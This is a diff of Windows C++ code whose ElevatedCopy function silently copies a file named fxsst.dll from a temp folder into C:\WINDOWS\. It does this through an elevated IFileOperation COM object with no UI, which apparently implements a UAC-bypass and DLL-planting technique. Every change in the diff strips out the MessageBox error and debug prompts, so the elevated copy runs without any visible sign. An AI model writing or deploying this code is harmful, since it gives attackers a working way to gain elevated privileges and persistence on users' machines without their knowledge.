@@ -100,14 +100,12 @@ void ElevatedCopy()
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
     if (FAILED(hr))
     {
-        MessageBox(NULL, L"Failed to initialize COM library", L"Error", MB_OK);
         return;
     }
     IFileOperation* pfo;
     hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation, IID_PPV_ARGS(&pfo));
     if (FAILED(hr))
     {
-        MessageBox(NULL, L"Failed to create IFileOperation instance", L"Error", MB_OK);
         return;
     }
     pfo->SetOperationFlags(FOF_NO_UI);
@@ -125,17 +123,14 @@ void ElevatedCopy()
     // Build the full path for the DLL
     wcscpy_s(szFxsstDllPath, len - 1, szLongTempDir);
     wcscat_s(szFxsstDllPath, len, L"fxsst.dll");
-    MessageBox(NULL, szFxsstDllPath, L"dll", MB_OK);
     hr = SHCreateItemFromParsingName(szFxsstDllPath, NULL, IID_PPV_ARGS(&from));
     if (FAILED(hr))
     {
-        MessageBox(NULL, L"Failed to create IShellItem from parsing name", L"Error", MB_OK);
         return;
     }
     hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\", NULL, IID_PPV_ARGS(&to));
     if (FAILED(hr))
     {
-        MessageBox(NULL, L"Failed to create IShellItem from parsing name", L"Error", MB_OK);
         return;
     }
     pfo->CopyItem(from, to, L"fxsst.dll", NULL);
